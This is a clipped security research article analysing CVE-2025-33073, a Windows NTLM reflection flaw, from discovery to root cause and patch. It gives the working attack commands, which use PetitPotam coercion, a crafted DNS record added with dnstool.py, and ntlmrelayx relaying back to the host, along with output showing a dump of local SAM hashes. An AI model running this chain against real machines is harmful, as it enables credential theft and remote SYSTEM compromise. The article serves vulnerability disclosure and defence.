---
title: "NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073"
source: "https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025.html?__readwiseLocation="
author:
  - "Synacktiv"
published:
created: 2025-08-13
description: "Introduction  NTLM reflection is a special case of NTLM authentication relay in which the original authentication is relayed back to the machine from which the authentication originated. This class of"
tags: ["clippings/articles", "_inbox"]
---
# NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073

![](https://www.synacktiv.com/sites/default/files/styles/blog_grid_view/public/2025-06/meme.png)

> [!summary]
> This article details CVE-2025-33073, an NTLM reflection vulnerability that bypasses existing mitigations, enabling authenticated remote command execution as SYSTEM on machines without SMB signing. The discovery involved observing unexpected NTLM local authentication when coercing with a specific DNS record format. The root cause lies in how LSASS processes target names, leading to the client's SYSTEM token being relayed. A similar Kerberos vulnerability was also found. The patch prevents SMB connections with marshalled target info, and SMB signing is recommended as a crucial defense-in-depth mitigation.

NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073

## Introduction

NTLM reflection is a special case of NTLM authentication relay in which the original authentication is relayed back to the machine from which the authentication originated. This class of vulnerability was publicly introduced via MS08-68, where Microsoft prevented SMB to SMB NTLM reflection. Over the years, other exploitation vectors were discovered and patched, such as HTTP to SMB reflection (patched in MS09-13) or DCOM to DCOM reflection (patched in MS15-076).

## Vulnerability discovery

As a baseline for our tests, let us see what happens when trying to relay an SMB authentication back to the same machine. Our test machine (SRV1) is an up-to-date Windows Server 2022, domain joined, with SMB signing not enforced:

`$ PetitPotam.py -u loki -p loki -d ASGARD.LOCAL 192.168.56.3 SRV1.ASGARD.LOCAL [-] Sending EfsRpcEncryptFileSrv! [+] Got expected ERROR_BAD_NETPATH exception!! [+] Attack worked!  # ntlmrelayx.py -t SRV1.ASGARD.LOCAL -smb2support [*] Servers started, waiting for connections [*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.56.14, attacking target smb://SRV1.ASGARD.LOCAL [-] Authenticating against smb://SRV1.ASGARD.LOCAL as ASGARD/SRV1$ FAILED`

PetitPotam coerces a SYSTEM service (lsass.exe) into authenticating to a controlled machine, therefore a machine account authentication is received. As the authentication originates from the same machine, the relay fails.

To hunt for unusual behavior, we fiddled with different parameters such as the listener host or the client IP address. We registered the `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` DNS record and made it point to our IP address. This format, [first documented](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.htmlhttps://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html) by James Forshaw and also tackled in [one of our previous blogpost](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx), can be used to coerce machines into authenticating via Kerberos to a controlled IP address.

`$ dnstool.py -u 'ASGARD.LOCAL\loki' -p loki 192.168.56.10 -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 192.168.56.3 [-] Adding new record [+] LDAP operation completed successfully  $ PetitPotam.py -u loki -p loki -d ASGARD.LOCAL srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA SRV1.ASGARD.LOCAL [-] Sending EfsRpcEncryptFileSrv! [+] Got expected ERROR_BAD_NETPATH exception!! [+] Attack worked!  # ntlmrelayx.py -t SRV1.ASGARD.LOCAL -smb2support [*] Servers started, waiting for connections [*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.56.14, attacking target smb://SRV1.ASGARD.LOCAL [*] Authenticating against smb://SRV1.ASGARD.LOCAL as / SUCCEED [*] Service RemoteRegistry is in stopped state [*] Starting service RemoteRegistry [*] Target system bootKey: 0x0c10b250470be78cbe1c92d1b7fe4e91 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:df3c08415194a27d27bb67dcbf6a6ebc::: user:1000:aad3b435b51404eeaad3b435b51404ee:57d583aa46d571502aad4bb7aea09c70::: [*] Done dumping SAM hashes for host: 192.168.56.14`

Even more surprisingly, `ntlmrelayx.py` was able to remotely dump the SAM hive, which means the identity we relayed was privileged on the machine. This seemed odd to us because the machine account is not privileged on its associated machine.

## Understanding the vulnerability

In order to quickly understand what had happened, network captures were done for both relay attacks. An obvious difference stood out: in the network capture of the relay with the `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` hostname, NTLM local authentication took place! On the contrary, when coercing the machine with an IP address as the listener, a standard NTLM authentication occurred.

### Local NTLM authentication

[NTLM local authentication](https://davenport.sourceforge.net/ntlm.html#localAuthentication) is a special case of NTLM authentication in which the server informs the client (in the `NTLM_CHALLENGE` message) that there is no need to compute the challenge response in the `NTLM_AUTHENTICATE` message.

When the client receives the `NTLM_CHALLENGE` message, it understands that local NTLM authentication must occur. It then adds its token into the server context which was passed  via the ID in the `Reserved` field.

## Conclusion

Even though CVE-2025-33073 is referred by Microsoft as an elevation of privilege, it is actually an authenticated remote command execution as SYSTEM on any machine which does not enforce SMB signing.